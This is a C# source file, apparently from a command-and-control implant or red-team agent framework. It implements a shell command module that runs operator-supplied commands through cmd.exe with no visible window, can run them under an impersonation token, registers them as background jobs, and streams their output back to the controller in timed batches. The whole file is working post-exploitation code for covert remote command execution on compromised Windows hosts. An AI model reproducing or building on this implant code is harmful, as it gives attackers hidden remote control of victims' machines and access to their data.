using Agent.Helpers;
using Agent.Models;
using Agent.Service;
using Shared;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class ShellCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Shell;

        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            task.ThrowIfParameterMissing(ParameterId.Command);

            var arg = task.GetParameter<string>(ParameterId.Command);
            var cmd = $@"c:\windows\system32\cmd.exe /c {arg}";

            var creationParms = new ProcessCreationParameters()
            {
                Command = cmd,
                RedirectOutput = true,
                CreateNoWindow = true,
                CurrentDirectory = Environment.CurrentDirectory
            };


            if (context.Agent.ImpersonationToken != IntPtr.Zero)
                creationParms.Token = context.Agent.ImpersonationToken;

            var procResult = APIWrapper.CreateProcess(creationParms);

            if (procResult.ProcessId == 0)
            {
                context.Error("Process start failed!");
                return;
            }

            var jobService = ServiceProvider.GetService<IJobService>();
            this.JobId = jobService.RegisterJob(procResult.ProcessId, "Shell " + arg, task.Id).Id;

            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            if (creationParms.RedirectOutput)
                APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output =>
                {
                    if(token.IsCancellationRequested)
                    {
                        Thread.CurrentThread.Abort();
                    }

                    context.AppendResult(output, false);
                    if (stopwatch.ElapsedMilliseconds > context.ConfigService.JobResultDelay)
                    {
                        context.Agent.SendTaskResult(context.Result).Wait();
                        context.ClearResult();
                        stopwatch.Restart();
                    }
                });
        }
    }
}
